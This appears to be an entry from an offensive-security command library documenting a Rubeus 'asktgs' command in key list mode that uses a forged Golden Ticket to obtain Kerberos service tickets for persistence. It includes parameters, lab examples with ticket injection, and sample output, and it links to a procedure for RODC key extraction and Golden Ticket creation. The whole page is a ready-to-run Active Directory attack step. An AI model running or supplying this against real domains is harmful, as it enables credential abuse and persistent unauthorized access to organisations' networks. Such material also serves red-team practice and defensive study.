---
type: command
executor: powershell
data: >-
  Rubeus.exe asktgs /enctype:aes256 /keyList /service:$_SERVICE/$_HOST
  /dc:$_DC_HOST /ticket:$_TGT_TICKET
tags:
  - persistence
  - kerberos
platforms:
  - Windows
verified: true
validated: true
---

# rubeus-asktgs-with-keylist

## Command

```powershell
Rubeus.exe asktgs /enctype:aes256 /keyList /service:$_SERVICE/$_HOST /dc:$_DC_HOST /ticket:$_TGT_TICKET
```

## Description

This command requests a TGS using a Golden Ticket and key list mode in Rubeus, allowing service access with the forged credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /enctype:aes256 | Encryption type | Yes |
| /keyList | Request all keys for the service | Yes |
| /service:$_SERVICE/$_HOST | Service principal (e.g., cifs/dc) | Yes |
| /dc:$_DC_HOST | Domain controller hostname | Yes |
| /ticket:$_TGT_TICKET | Base64-encoded TGT ticket | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=
```

### Advanced Usage

For specific service:

```powershell
Rubeus.exe asktgs /enctype:aes256 /keyList /service:cifs/dc1.lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM= /ptt
```

## Expected Output

Service ticket:

```
[*] Action: Ask TGS
[*] Service       : krbtgt/lab.local
[*] Ticket: doIFmjCC... (base64 ticket)
[*] Requesting TGS ticket for service 'krbtgt/lab.local' using AES256
[*] Sent 1 TGS-REQs and received 1 TGS-REPs
[*]  TGS-REP for 'krbtgt/lab.local' exported to: tgs.kirbi
```

## Related

- [[procedures/RODC-Key-List-Extraction-and-Golden-Ticket-Creation]]
- [[tools/Rubeus]]
